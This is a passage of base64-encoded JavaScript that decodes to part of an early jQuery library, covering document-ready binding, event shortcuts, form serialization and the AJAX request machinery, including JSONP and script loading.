GlzdCwgZnVuY3Rpb24oKXsKCQkJCQl0aGlzLmFwcGx5KCBkb2N1bWVudCApOwoJCQkJfSk7CgkJCQkKCQkJCS8vIFJlc2V0IHRoZSBsaXN0IG9mIGZ1bmN0aW9ucwoJCQkJalF1ZXJ5LnJlYWR5TGlzdCA9IG51bGw7CgkJCX0KCQkKCQkJLy8gVHJpZ2dlciBhbnkgYm91bmQgcmVhZHkgZXZlbnRzCgkJCWpRdWVyeShkb2N1bWVudCkudHJpZ2dlckhhbmRsZXIoInJlYWR5Iik7CgkJfQoJfQp9KTsKCnZhciByZWFkeUJvdW5kID0gZmFsc2U7CgpmdW5jdGlvbiBiaW5kUmVhZHkoKXsKCWlmICggcmVhZHlCb3VuZCApIHJldHVybjsKCXJlYWR5Qm91bmQgPSB0cnVlOwoKCS8vIE1vemlsbGEsIE9wZXJhIChzZWUgZnVydGhlciBiZWxvdyBmb3IgaXQpIGFuZCB3ZWJraXQgbmlnaHRsaWVzIGN1cnJlbnRseSBzdXBwb3J0IHRoaXMgZXZlbnQKCWlmICggZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lciAmJiAhalF1ZXJ5LmJyb3dzZXIub3BlcmEpCgkJLy8gVXNlIHRoZSBoYW5keSBldmVudCBjYWxsYmFjawoJCWRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoICJET01Db250ZW50TG9hZGVkIiwgalF1ZXJ5LnJlYWR5LCBmYWxzZSApOwoJCgkvLyBJZiBJRSBpcyB1c2VkIGFuZCBpcyBub3QgaW4gYSBmcmFtZQoJLy8gQ29udGludWFsbHkgY2hlY2sgdG8gc2VlIGlmIHRoZSBkb2N1bWVudCBpcyByZWFkeQoJaWYgKCBqUXVlcnkuYnJvd3Nlci5tc2llICYmIHdpbmRvdyA9PSB0b3AgKSAoZnVuY3Rpb24oKXsKCQlpZiAoalF1ZXJ5LmlzUmVhZHkpIHJldHVybjsKCQl0cnkgewoJCQkvLyBJZiBJRSBpcyB1c2VkLCB1c2UgdGhlIHRyaWNrIGJ5IERpZWdvIFBlcmluaQoJCQkvLyBodHRwOi8vamF2YXNjcmlwdC5ud2JveC5jb20vSUVDb250ZW50TG9hZGVkLwoJCQlkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQuZG9TY3JvbGwoImxlZnQiKTsKCQl9IGNhdGNoKCBlcnJvciApIHsKCQkJc2V0VGltZW91dCggYXJndW1lbnRzLmNhbGxlZSwgMCApOwoJCQlyZXR1cm47CgkJfQoJCS8vIGFuZCBleGVjdXRlIGFueSB3YWl0aW5nIGZ1bmN0aW9ucwoJCWpRdWVyeS5yZWFkeSgpOwoJfSkoKTsKCglpZiAoIGpRdWVyeS5icm93c2VyLm9wZXJhICkKCQlkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCAiRE9NQ29udGVudExvYWRlZCIsIGZ1bmN0aW9uICgpIHsKCQkJaWYgKGpRdWVyeS5pc1JlYWR5KSByZXR1cm47CgkJCWZvciAodmFyIGkgPSAwOyBpIDwgZG9jdW1lbnQuc3R5bGVTaGVldHMubGVuZ3RoOyBpKyspCgkJCQlpZiAoZG9jdW1lbnQuc3R5bGVTaGVldHNbaV0uZGlzYWJsZWQpIHsKCQkJCQlzZXRUaW1lb3V0KCBhcmd1bWVudHMuY2FsbGVlLCAwICk7CgkJCQkJcmV0dXJuOwoJCQkJfQoJCQkvLyBhbmQgZXhlY3V0ZSBhbnkgd2FpdGluZyBmdW5jdGlvbnMKCQkJalF1ZXJ5LnJlYWR5KCk7CgkJfSwgZmFsc2UpOwoKCWlmICggalF1ZXJ5LmJyb3dzZXIuc2FmYXJpICkgewoJCXZhciBudW1TdHlsZXM7CgkJKGZ1bmN0aW9uKCl7CgkJCWlmIChqUXVlcnkuaXNSZWFkeSkgcmV0dXJuOwoJCQlpZiAoIGRvY3VtZW50LnJlYWR5U3RhdGUgIT0gImxvYWRlZCIgJiYgZG9jdW1lbnQucmVhZHlTdGF0ZSAhPSAiY29tcGxldGUiICkgewoJCQkJc2V0VGltZW91dCggYXJndW1lbnRzLmNhbGxlZSwgMCApOwoJCQkJcmV0dXJuOwoJCQl9CgkJCWlmICggbnVtU3R5bGVzID09PSB1bmRlZmluZWQgKQoJCQkJbnVtU3R5bGVzID0galF1ZXJ5KCJzdHlsZSwgbGlua1tyZWw9c3R5bGVzaGVldF0iKS5sZW5ndGg7CgkJCWlmICggZG9jdW1lbnQuc3R5bGVTaGVldHMubGVuZ3RoICE9IG51bVN0eWxlcyApIHsKCQkJCXNldFRpbWVvdXQoIGFyZ3VtZW50cy5jYWxsZWUsIDAgKTsKCQkJCXJldHVybjsKCQkJfQoJCQkvLyBhbmQgZXhlY3V0ZSBhbnkgd2FpdGluZyBmdW5jdGlvbnMKCQkJalF1ZXJ5LnJlYWR5KCk7CgkJfSkoKTsKCX0KCgkvLyBBIGZhbGxiYWNrIHRvIHdpbmRvdy5vbmxvYWQsIHRoYXQgd2lsbCBhbHdheXMgd29yawoJalF1ZXJ5LmV2ZW50LmFkZCggd2luZG93LCAibG9hZCIsIGpRdWVyeS5yZWFkeSApOwp9CgpqUXVlcnkuZWFjaCggKCJibHVyLGZvY3VzLGxvYWQscmVzaXplLHNjcm9sbCx1bmxvYWQsY2xpY2ssZGJsY2xpY2ssIiArCgkibW91c2Vkb3duLG1vdXNldXAsbW91c2Vtb3ZlLG1vdXNlb3Zlcixtb3VzZW91dCxjaGFuZ2Usc2VsZWN0LCIgKyAKCSJzdWJtaXQsa2V5ZG93bixrZXlwcmVzcyxrZXl1cCxlcnJvciIpLnNwbGl0KCIsIiksIGZ1bmN0aW9uKGksIG5hbWUpewoJCgkvLyBIYW5kbGUgZXZlbnQgYmluZGluZwoJalF1ZXJ5LmZuW25hbWVdID0gZnVuY3Rpb24oZm4pewoJCXJldHVybiBmbiA/IHRoaXMuYmluZChuYW1lLCBmbikgOiB0aGlzLnRyaWdnZXIobmFtZSk7Cgl9Owp9KTsKCi8vIENoZWNrcyBpZiBhbiBldmVudCBoYXBwZW5lZCBvbiBhbiBlbGVtZW50IHdpdGhpbiBhbm90aGVyIGVsZW1lbnQKLy8gVXNlZCBpbiBqUXVlcnkuZXZlbnQuc3BlY2lhbC5tb3VzZWVudGVyIGFuZCBtb3VzZWxlYXZlIGhhbmRsZXJzCnZhciB3aXRoaW5FbGVtZW50ID0gZnVuY3Rpb24oZXZlbnQsIGVsZW0pIHsKCS8vIENoZWNrIGlmIG1vdXNlKG92ZXJ8b3V0KSBhcmUgc3RpbGwgd2l0aGluIHRoZSBzYW1lIHBhcmVudCBlbGVtZW50Cgl2YXIgcGFyZW50ID0gZXZlbnQucmVsYXRlZFRhcmdldDsKCS8vIFRyYXZlcnNlIHVwIHRoZSB0cmVlCgl3aGlsZSAoIHBhcmVudCAmJiBwYXJlbnQgIT0gZWxlbSApIHRyeSB7IHBhcmVudCA9IHBhcmVudC5wYXJlbnROb2RlOyB9IGNhdGNoKGVycm9yKSB7IHBhcmVudCA9IGVsZW07IH0KCS8vIFJldHVybiB0cnVlIGlmIHdlIGFjdHVhbGx5IGp1c3QgbW91c2VkIG9uIHRvIGEgc3ViLWVsZW1lbnQKCXJldHVybiBwYXJlbnQgPT0gZWxlbTsKfTsKCi8vIFByZXZlbnQgbWVtb3J5IGxlYWtzIGluIElFCi8vIEFuZCBwcmV2ZW50IGVycm9ycyBvbiByZWZyZXNoIHdpdGggZXZlbnRzIGxpa2UgbW91c2VvdmVyIGluIG90aGVyIGJyb3dzZXJzCi8vIFdpbmRvdyBpc24ndCBpbmNsdWRlZCBzbyBhcyBub3QgdG8gdW5iaW5kIGV4aXN0aW5nIHVubG9hZCBldmVudHMKalF1ZXJ5KHdpbmRvdykuYmluZCgidW5sb2FkIiwgZnVuY3Rpb24oKSB7CglqUXVlcnkoIioiKS5hZGQoZG9jdW1lbnQpLnVuYmluZCgpOwp9KTsKalF1ZXJ5LmZuLmV4dGVuZCh7Cglsb2FkOiBmdW5jdGlvbiggdXJsLCBwYXJhbXMsIGNhbGxiYWNrICkgewoJCWlmICggalF1ZXJ5LmlzRnVuY3Rpb24oIHVybCApICkKCQkJcmV0dXJuIHRoaXMuYmluZCgibG9hZCIsIHVybCk7CgoJCXZhciBvZmYgPSB1cmwuaW5kZXhPZigiICIpOwoJCWlmICggb2ZmID49IDAgKSB7CgkJCXZhciBzZWxlY3RvciA9IHVybC5zbGljZShvZmYsIHVybC5sZW5ndGgpOwoJCQl1cmwgPSB1cmwuc2xpY2UoMCwgb2ZmKTsKCQl9CgoJCWNhbGxiYWNrID0gY2FsbGJhY2sgfHwgZnVuY3Rpb24oKXt9OwoKCQkvLyBEZWZhdWx0IHRvIGEgR0VUIHJlcXVlc3QKCQl2YXIgdHlwZSA9ICJHRVQiOwoKCQkvLyBJZiB0aGUgc2Vjb25kIHBhcmFtZXRlciB3YXMgcHJvdmlkZWQKCQlpZiAoIHBhcmFtcyApCgkJCS8vIElmIGl0J3MgYSBmdW5jdGlvbgoJCQlpZiAoIGpRdWVyeS5pc0Z1bmN0aW9uKCBwYXJhbXMgKSApIHsKCQkJCS8vIFdlIGFzc3VtZSB0aGF0IGl0J3MgdGhlIGNhbGxiYWNrCgkJCQljYWxsYmFjayA9IHBhcmFtczsKCQkJCXBhcmFtcyA9IG51bGw7CgoJCQkvLyBPdGhlcndpc2UsIGJ1aWxkIGEgcGFyYW0gc3RyaW5nCgkJCX0gZWxzZSB7CgkJCQlwYXJhbXMgPSBqUXVlcnkucGFyYW0oIHBhcmFtcyApOwoJCQkJdHlwZSA9ICJQT1NUIjsKCQkJfQoKCQl2YXIgc2VsZiA9IHRoaXM7CgoJCS8vIFJlcXVlc3QgdGhlIHJlbW90ZSBkb2N1bWVudAoJCWpRdWVyeS5hamF4KHsKCQkJdXJsOiB1cmwsCgkJCXR5cGU6IHR5cGUsCgkJCWRhdGFUeXBlOiAiaHRtbCIsCgkJCWRhdGE6IHBhcmFtcywKCQkJY29tcGxldGU6IGZ1bmN0aW9uKHJlcywgc3RhdHVzKXsKCQkJCS8vIElmIHN1Y2Nlc3NmdWwsIGluamVjdCB0aGUgSFRNTCBpbnRvIGFsbCB0aGUgbWF0Y2hlZCBlbGVtZW50cwoJCQkJaWYgKCBzdGF0dXMgPT0gInN1Y2Nlc3MiIHx8IHN0YXR1cyA9PSAibm90bW9kaWZpZWQiICkKCQkJCQkvLyBTZWUgaWYgYSBzZWxlY3RvciB3YXMgc3BlY2lmaWVkCgkJCQkJc2VsZi5odG1sKCBzZWxlY3RvciA/CgkJCQkJCS8vIENyZWF0ZSBhIGR1bW15IGRpdiB0byBob2xkIHRoZSByZXN1bHRzCgkJCQkJCWpRdWVyeSgiPGRpdi8+IikKCQkJCQkJCS8vIGluamVjdCB0aGUgY29udGVudHMgb2YgdGhlIGRvY3VtZW50IGluLCByZW1vdmluZyB0aGUgc2NyaXB0cwoJCQkJCQkJLy8gdG8gYXZvaWQgYW55ICdQZXJtaXNzaW9uIERlbmllZCcgZXJyb3JzIGluIElFCgkJCQkJCQkuYXBwZW5kKHJlcy5yZXNwb25zZVRleHQucmVwbGFjZSgvPHNjcmlwdCgufFxzKSo/XC9zY3JpcHQ+L2csICIiKSkKCgkJCQkJCQkvLyBMb2NhdGUgdGhlIHNwZWNpZmllZCBlbGVtZW50cwoJCQkJCQkJLmZpbmQoc2VsZWN0b3IpIDoKCgkJCQkJCS8vIElmIG5vdCwganVzdCBpbmplY3QgdGhlIGZ1bGwgcmVzdWx0CgkJCQkJCXJlcy5yZXNwb25zZVRleHQgKTsKCgkJCQlzZWxmLmVhY2goIGNhbGxiYWNrLCBbcmVzLnJlc3BvbnNlVGV4dCwgc3RhdHVzLCByZXNdICk7CgkJCX0KCQl9KTsKCQlyZXR1cm4gdGhpczsKCX0sCgoJc2VyaWFsaXplOiBmdW5jdGlvbigpIHsKCQlyZXR1cm4galF1ZXJ5LnBhcmFtKHRoaXMuc2VyaWFsaXplQXJyYXkoKSk7Cgl9LAoJc2VyaWFsaXplQXJyYXk6IGZ1bmN0aW9uKCkgewoJCXJldHVybiB0aGlzLm1hcChmdW5jdGlvbigpewoJCQlyZXR1cm4galF1ZXJ5Lm5vZGVOYW1lKHRoaXMsICJmb3JtIikgPwoJCQkJalF1ZXJ5Lm1ha2VBcnJheSh0aGlzLmVsZW1lbnRzKSA6IHRoaXM7CgkJfSkKCQkuZmlsdGVyKGZ1bmN0aW9uKCl7CgkJCXJldHVybiB0aGlzLm5hbWUgJiYgIXRoaXMuZGlzYWJsZWQgJiYgCgkJCQkodGhpcy5jaGVja2VkIHx8IC9zZWxlY3R8dGV4dGFyZWEvaS50ZXN0KHRoaXMubm9kZU5hbWUpIHx8IAoJCQkJCS90ZXh0fGhpZGRlbnxwYXNzd29yZC9pLnRlc3QodGhpcy50eXBlKSk7CgkJfSkKCQkubWFwKGZ1bmN0aW9uKGksIGVsZW0pewoJCQl2YXIgdmFsID0galF1ZXJ5KHRoaXMpLnZhbCgpOwoJCQlyZXR1cm4gdmFsID09IG51bGwgPyBudWxsIDoKCQkJCXZhbC5jb25zdHJ1Y3RvciA9PSBBcnJheSA/CgkJCQkJalF1ZXJ5Lm1hcCggdmFsLCBmdW5jdGlvbih2YWwsIGkpewoJCQkJCQlyZXR1cm4ge25hbWU6IGVsZW0ubmFtZSwgdmFsdWU6IHZhbH07CgkJCQkJfSkgOgoJCQkJCXtuYW1lOiBlbGVtLm5hbWUsIHZhbHVlOiB2YWx9OwoJCX0pLmdldCgpOwoJfQp9KTsKCi8vIEF0dGFjaCBhIGJ1bmNoIG9mIGZ1bmN0aW9ucyBmb3IgaGFuZGxpbmcgY29tbW9uIEFKQVggZXZlbnRzCmpRdWVyeS5lYWNoKCAiYWpheFN0YXJ0LGFqYXhTdG9wLGFqYXhDb21wbGV0ZSxhamF4RXJyb3IsYWpheFN1Y2Nlc3MsYWpheFNlbmQiLnNwbGl0KCIsIiksIGZ1bmN0aW9uKGksbyl7CglqUXVlcnkuZm5bb10gPSBmdW5jdGlvbihmKXsKCQlyZXR1cm4gdGhpcy5iaW5kKG8sIGYpOwoJfTsKfSk7Cgp2YXIganNjID0gKG5ldyBEYXRlKS5nZXRUaW1lKCk7CgpqUXVlcnkuZXh0ZW5kKHsKCWdldDogZnVuY3Rpb24oIHVybCwgZGF0YSwgY2FsbGJhY2ssIHR5cGUgKSB7CgkJLy8gc2hpZnQgYXJndW1lbnRzIGlmIGRhdGEgYXJndW1lbnQgd2FzIG9tbWl0ZWQKCQlpZiAoIGpRdWVyeS5pc0Z1bmN0aW9uKCBkYXRhICkgKSB7CgkJCWNhbGxiYWNrID0gZGF0YTsKCQkJZGF0YSA9IG51bGw7CgkJfQoJCQoJCXJldHVybiBqUXVlcnkuYWpheCh7CgkJCXR5cGU6ICJHRVQiLAoJCQl1cmw6IHVybCwKCQkJZGF0YTogZGF0YSwKCQkJc3VjY2VzczogY2FsbGJhY2ssCgkJCWRhdGFUeXBlOiB0eXBlCgkJfSk7Cgl9LAoKCWdldFNjcmlwdDogZnVuY3Rpb24oIHVybCwgY2FsbGJhY2sgKSB7CgkJcmV0dXJuIGpRdWVyeS5nZXQodXJsLCBudWxsLCBjYWxsYmFjaywgInNjcmlwdCIpOwoJfSwKCglnZXRKU09OOiBmdW5jdGlvbiggdXJsLCBkYXRhLCBjYWxsYmFjayApIHsKCQlyZXR1cm4galF1ZXJ5LmdldCh1cmwsIGRhdGEsIGNhbGxiYWNrLCAianNvbiIpOwoJfSwKCglwb3N0OiBmdW5jdGlvbiggdXJsLCBkYXRhLCBjYWxsYmFjaywgdHlwZSApIHsKCQlpZiAoIGpRdWVyeS5pc0Z1bmN0aW9uKCBkYXRhICkgKSB7CgkJCWNhbGxiYWNrID0gZGF0YTsKCQkJZGF0YSA9IHt9OwoJCX0KCgkJcmV0dXJuIGpRdWVyeS5hamF4KHsKCQkJdHlwZTogIlBPU1QiLAoJCQl1cmw6IHVybCwKCQkJZGF0YTogZGF0YSwKCQkJc3VjY2VzczogY2FsbGJhY2ssCgkJCWRhdGFUeXBlOiB0eXBlCgkJfSk7Cgl9LAoKCWFqYXhTZXR1cDogZnVuY3Rpb24oIHNldHRpbmdzICkgewoJCWpRdWVyeS5leHRlbmQoIGpRdWVyeS5hamF4U2V0dGluZ3MsIHNldHRpbmdzICk7Cgl9LAoKCWFqYXhTZXR0aW5nczogewoJCWdsb2JhbDogdHJ1ZSwKCQl0eXBlOiAiR0VUIiwKCQl0aW1lb3V0OiAwLAoJCWNvbnRlbnRUeXBlOiAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIiwKCQlwcm9jZXNzRGF0YTogdHJ1ZSwKCQlhc3luYzogdHJ1ZSwKCQlkYXRhOiBudWxsLAoJCXVzZXJuYW1lOiBudWxsLAoJCXBhc3N3b3JkOiBudWxsLAoJCWFjY2VwdHM6IHsKCQkJeG1sOiAiYXBwbGljYXRpb24veG1sLCB0ZXh0L3htbCIsCgkJCWh0bWw6ICJ0ZXh0L2h0bWwiLAoJCQlzY3JpcHQ6ICJ0ZXh0L2phdmFzY3JpcHQsIGFwcGxpY2F0aW9uL2phdmFzY3JpcHQiLAoJCQlqc29uOiAiYXBwbGljYXRpb24vanNvbiwgdGV4dC9qYXZhc2NyaXB0IiwKCQkJdGV4dDogInRleHQvcGxhaW4iLAoJCQlfZGVmYXVsdDogIiovKiIKCQl9Cgl9LAoJCgkvLyBMYXN0LU1vZGlmaWVkIGhlYWRlciBjYWNoZSBmb3IgbmV4dCByZXF1ZXN0CglsYXN0TW9kaWZpZWQ6IHt9LAoKCWFqYXg6IGZ1bmN0aW9uKCBzICkgewoJCXZhciBqc29ucCwganNyZSA9IC89XD8oJnwkKS9nLCBzdGF0dXMsIGRhdGE7CgoJCS8vIEV4dGVuZCB0aGUgc2V0dGluZ3MsIGJ1dCByZS1leHRlbmQgJ3MnIHNvIHRoYXQgaXQgY2FuIGJlCgkJLy8gY2hlY2tlZCBhZ2FpbiBsYXRlciAoaW4gdGhlIHRlc3Qgc3VpdGUsIHNwZWNpZmljYWxseSkKCQlzID0galF1ZXJ5LmV4dGVuZCh0cnVlLCBzLCBqUXVlcnkuZXh0ZW5kKHRydWUsIHt9LCBqUXVlcnkuYWpheFNldHRpbmdzLCBzKSk7CgoJCS8vIGNvbnZlcnQgZGF0YSBpZiBub3QgYWxyZWFkeSBhIHN0cmluZwoJCWlmICggcy5kYXRhICYmIHMucHJvY2Vzc0RhdGEgJiYgdHlwZW9mIHMuZGF0YSAhPSAic3RyaW5nIiApCgkJCXMuZGF0YSA9IGpRdWVyeS5wYXJhbShzLmRhdGEpOwoKCQkvLyBIYW5kbGUgSlNPTlAgUGFyYW1ldGVyIENhbGxiYWNrcwoJCWlmICggcy5kYXRhVHlwZSA9PSAianNvbnAiICkgewoJCQlpZiAoIHMudHlwZS50b0xvd2VyQ2FzZSgpID09ICJnZXQiICkgewoJCQkJaWYgKCAhcy51cmwubWF0Y2goanNyZSkgKQoJCQkJCXMudXJsICs9IChzLnVybC5tYXRjaCgvXD8vKSA/ICImIiA6ICI/IikgKyAocy5qc29ucCB8fCAiY2FsbGJhY2siKSArICI9PyI7CgkJCX0gZWxzZSBpZiAoICFzLmRhdGEgfHwgIXMuZGF0YS5tYXRjaChqc3JlKSApCgkJCQlzLmRhdGEgPSAocy5kYXRhID8gcy5kYXRhICsgIiYiIDogIiIpICsgKHMuanNvbnAgfHwgImNhbGxiYWNrIikgKyAiPT8iOwoJCQlzLmRhdGFUeXBlID0gImpzb24iOwoJCX0KCgkJLy8gQnVpbGQgdGVtcG9yYXJ5IEpTT05QIGZ1bmN0aW9uCgkJaWYgKCBzLmRhdGFUeXBlID09ICJqc29uIiAmJiAocy5kYXRhICYmIHMuZGF0YS5tYXRjaChqc3JlKSB8fCBzLnVybC5tYXRjaChqc3JlKSkgKSB7CgkJCWpzb25wID0gImpzb25wIiArIGpzYysrOwoKCQkJLy8gUmVwbGFjZSB0aGUgPT8gc2VxdWVuY2UgYm90aCBpbiB0aGUgcXVlcnkgc3RyaW5nIGFuZCB0aGUgZGF0YQoJCQlpZiAoIHMuZGF0YSApCgkJCQlzLmRhdGEgPSAocy5kYXRhICsgIiIpLnJlcGxhY2UoanNyZSwgIj0iICsganNvbnAgKyAiJDEiKTsKCQkJcy51cmwgPSBzLnVybC5yZXBsYWNlKGpzcmUsICI9IiArIGpzb25wICsgIiQxIik7CgoJCQkvLyBXZSBuZWVkIHRvIG1ha2Ugc3VyZQoJCQkvLyB0aGF0IGEgSlNPTlAgc3R5bGUgcmVzcG9uc2UgaXMgZXhlY3V0ZWQgcHJvcGVybHkKCQkJcy5kYXRhVHlwZSA9ICJzY3JpcHQiOwoKCQkJLy8gSGFuZGxlIEpTT05QLXN0eWxlIGxvYWRpbmcKCQkJd2luZG93WyBqc29ucCBdID0gZnVuY3Rpb24odG1wKXsKCQkJCWRhdGEgPSB0bXA7CgkJCQlzdWNjZXNzKCk7CgkJCQljb21wbGV0ZSgpOwoJCQkJLy8gR2FyYmFnZSBjb2xsZWN0CgkJCQl3aW5kb3dbIGpzb25wIF0gPSB1bmRlZmluZWQ7CgkJCQl0cnl7IGRlbGV0ZSB3aW5kb3dbIGpzb25wIF07IH0gY2F0Y2goZSl7fQoJCQkJaWYgKCBoZWFkICkKCQkJCQloZWFkLnJlbW92ZUNoaWxkKCBzY3JpcHQgKTsKCQkJfTsKCQl9CgoJCWlmICggcy5kYXRhVHlwZSA9PSAic2NyaXB0IiAmJiBzLmNhY2hlID09IG51bGwgKQoJCQlzLmNhY2hlID0gZmFsc2U7CgoJCWlmICggcy5jYWNoZSA9PT0gZmFsc2UgJiYgcy50eXBlLnRvTG93ZXJDYXNlKCkgPT0gImdldCIgKSB7CgkJCXZhciB0cyA9IChuZXcgRGF0ZSgpKS5nZXRUaW1lKCk7CgkJCS8vIHRyeSByZXBsYWNpbmcgXz0gaWYgaXQgaXMgdGhlcmUKCQkJdmFyIHJldCA9IHMudXJsLnJlcGxhY2UoLyhcP3wmKV89Lio/KCZ8JCkvLCAiJDFfPSIgKyB0cyArICIkMiIpOwoJCQkvLyBpZiBub3RoaW5nIHdhcyByZXBsYWNlZCwgYWRkIHRpbWVzdGFtcCB0byB0aGUgZW5kCgkJCXMudXJsID0gcmV0ICsgKChyZXQgPT0gcy51cmwpID8gKHMudXJsLm1hdGNoKC9cPy8pID8gIiYiIDogIj8iKSArICJfPSIgKyB0cyA6ICIiKTsKCQl9CgoJCS8vIElmIGRhdGEgaXMgYXZhaWxhYmxlLCBhcHBlbmQgZGF0YSB0byB1cmwgZm9yIGdldCByZXF1ZXN0cwoJCWlmICggcy5kYXRhICYmIHMudHlwZS50b0xvd2VyQ2FzZSgpID09ICJnZXQiICkgewoJCQlzLnVybCArPSAocy51cmwubWF0Y2goL1w/LykgPyAiJiIgOiAiPyIpICsgcy5kYXRhOwoKCQkJLy8gSUUgbGlrZXMgdG8gc2VuZCBib3RoIGdldCBhbmQgcG9zdCBkYXRhLCBwcmV2ZW50IHRoaXMKCQkJcy5kYXRhID0gbnVsbDsKCQl9CgoJCS8vIFdhdGNoIGZvciBhIG5ldyBzZXQgb2YgcmVxdWVzdHMKCQlpZiAoIHMuZ2xvYmFsICYmICEgalF1ZXJ5LmFjdGl2ZSsrICkKCQkJalF1ZXJ5LmV2ZW50LnRyaWdnZXIoICJhamF4U3RhcnQiICk7CgoJCS8vIElmIHdlJ3JlIHJlcXVlc3RpbmcgYSByZW1vdGUgZG9jdW1lbnQKCQkvLyBhbmQgdHJ5aW5nIHRvIGxvYWQgSlNPTiBvciBTY3JpcHQgd2l0aCBhIEdFVAoJCWlmICggKCFzLnVybC5pbmRleE9mKCJodHRwIikgfHwgIXMudXJsLmluZGV4T2YoIi8vIikpICYmIHMuZGF0YVR5cGUgPT0gInNjcmlwdCIgJiYgcy50eXBlLnRvTG93ZXJDYXNlKCkgPT0gImdldCIgKSB7CgkJCXZhciBoZWFkID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoImhlYWQiKVswXTsKCQkJdmFyIHNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpOwoJCQlzY3JpcHQuc3JjID0gcy51cmw7CgkJCWlmIChzLnNjcmlwdENoYXJzZXQpCgkJCQlzY3JpcHQuY2hhcnNldCA9IHMuc2NyaXB0Q2hhcnNldDsKCgkJCS8vIEhhbmRsZSBTY3JpcHQgbG9hZGluZwoJCQlpZiAoICFqc29ucCApIHsKCQkJCXZhciBkb25lID0gZmFsc2U7CgoJCQkJLy8gQXR0YWNoIGhhbmRsZXJzIGZvciBhbGwgYnJvd3NlcnMKCQkJCXNjcmlwdC5vbmxvYWQgPSBzY3JpcHQub25yZWFkeXN0YXRlY2hhbmdlID0gZnVuY3Rpb24oKXsKCQkJCQlpZiAoICFkb25lICYmICghdGhpcy5yZWFkeVN0YXRlIHx8IAoJCQkJCQkJdGhpcy5yZWFkeVN0YXRlID09ICJsb2FkZWQiIHx8IHRoaXMucmVhZHlTdGF0ZSA9PSAiY29tcGxldGUiKSApIHsKCQkJCQkJZG9uZSA9IHRydWU7CgkJCQkJCXN1Y2Nlc3MoKTsKCQkJCQkJY29tcGxldGUoKTsKCQkJCQkJaGVhZC5yZW1vdmVDaGlsZCggc2NyaXB0ICk7CgkJCQkJfQoJCQkJfTsKCQkJfQoKCQkJaGVhZC5hcHBlbmRDaGlsZChzY3JpcHQpOwoKCQkJLy8gV2UgaGFuZGxlIGV2ZXJ5dGhpbmcgdXNpbmcgdGhlIHNjcmlwdCBlbGVtZW50IGluamVjdGlvbgoJCQlyZXR1cm4gdW5kZWZpbmVkOwoJCX0KCgkJdmFyIHJlcXVlc3REb25lID0gZmFsc2U7CgoJCS8vIENyZWF0ZSB0aGUgcmVxdWVzdCBvYmplY3Q7IE1pY3Jvc29mdCBmYWlsZWQgdG8gcHJvcGVybHkKCQkvLyBpbXBsZW1lbnQgdGhlIFhNTEh0dHBSZXF1ZXN0IGluIElFNywgc28gd2UgdXNlIHRoZSBBY3RpdmVYT2JqZWN0IHdoZW4gaXQgaXMgYXZhaWxhYmxlCgkJdmFyIHhtbCA9IHdpbmRvdy5BY3RpdmVYT2JqZWN0ID8gbmV3IEFjdGl2ZVhPYmplY3QoIk1pY3Jvc29mdC5YTUxIVFRQIikgOiBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKCgkJLy8gT3BlbiB0aGUgc29ja2V0CgkJeG1sLm9wZW4ocy50eXBlLCBzLnVybCwgcy5hc3luYywgcy51c2VybmFtZSwgcy5wYXNzd29yZCk7CgoJCS8vIE5lZWQgYW4gZXh0cmEgdHJ5L2NhdGNoIGZvciBjcm9zcyBkb21haW4gcmVxdWVzdHMgaW4gRmlyZWZveCAzCgkJdHJ5IHsKCQkJLy8gU2V0IHRoZSBjb3JyZWN0IGhlYWRlciwgaWYgZGF0YSBpcyBiZWluZyBzZW50CgkJCWlmICggcy5kYXRhICkKCQkJCXhtbC5zZXRSZXF1ZXN0SGVhZGVyKCJDb250ZW50LVR5cGUiLCBzLmNvbnRlbnRUeXBlKTsKCgkJCS8vIFNldCB0aGUgSWYtTW9kaWZpZWQtU2luY2UgaGVhZGVyLCBpZiBpZk1vZGlmaWVkIG1vZGUuCgkJCWlmICggcy5pZk1vZGlmaWVkICkKCQkJCXhtbC5zZXRSZXF1ZXN0SGVhZGVyKCJJZi1Nb2RpZmllZC1TaW5jZSIsCgkJCQkJalF1ZXJ5Lmxhc3RNb2RpZmllZFtzLnVybF0gfHwgIlRodSwgMDEgSmFuIDE5NzAgMDA6MDA6MDAgR01UIiApOwoKCQkJLy8gU2V0IGhlYWRlciBzbyB0aGUgY2FsbGVkIHNjcmlwdCBrbm93cyB0aGF0IGl0J3MgYW4gWE1MSHR0cFJlcXVlc3QKCQkJeG1sLnNldFJlcXVlc3RIZWFkZXIoIlgtUmVxdWVzdGVkLVdpdGgiLCAiWE1MSHR0cFJlcXVlc3QiKTsKCgkJCS8vIFNldCB0aGUgQWNjZXB0cyBoZWFkZXIgZm9yIHRoZSBzZXJ2ZXIsIGRlcGVuZGluZyBvbiB0aGUgZGF0YVR5cGUKCQkJeG1sLnNldFJlcXVlc3RIZWFkZXIoIkFjY2VwdCIsIHMuZGF0YVR5cGUgJiYgcy5hY2NlcHRzWyBzLmRhdGFUeXBlIF0gPwoJCQkJcy5hY2NlcHRzWyBzLmRhdGFUeXBlIF0gKyAiLCAqLyoiIDoKCQkJCXMuYWNjZXB0cy5fZGVmYXVsdCApOwoJCX0gY2F0Y2goZSl7fQoKCQkvLyBBbGxvdyBjdXN0b20gaGVhZGVycy9taW1ldHlwZXMKCQlpZiAoIHMuYmVmb3JlU2VuZCApCgkJCXMuYmVmb3JlU2VuZCh4bWwpOwoJCQkKCQlpZiAoIHMuZ2xvYmFsICkKCQkJalF1ZXJ5LmV2ZW50LnRyaWdnZXIoImFqYXhTZW5kIiwgW3htbCwgc10pOwoKCQkvLyBXYWl0IGZvciBhIHJlc3BvbnNlIHRvIGNvbWUgYmFjawoJCXZhciBvbnJlYWR5c3RhdGVjaGFuZ2UgPSBmdW5jdGlvbihpc1RpbWVvdXQpewoJCQkvLyBUaGUgdHJhbnNmZXIgaXMgY29tcGxldGUgYW5kIHRoZSBkYXRhIGlzIGF2YWlsYWJsZSwgb3IgdGhlIHJlcXVlc3QgdGltZWQgb3V0CgkJCWlmICggIXJlcXVlc3REb25lICYmIHhtbCAmJiAoeG1sLnJlYWR5U3RhdGUgPT0gNCB8fCBpc1RpbWVvdXQgPT0gInRpbWVvdXQiKSApIHsKCQkJCXJlcXVl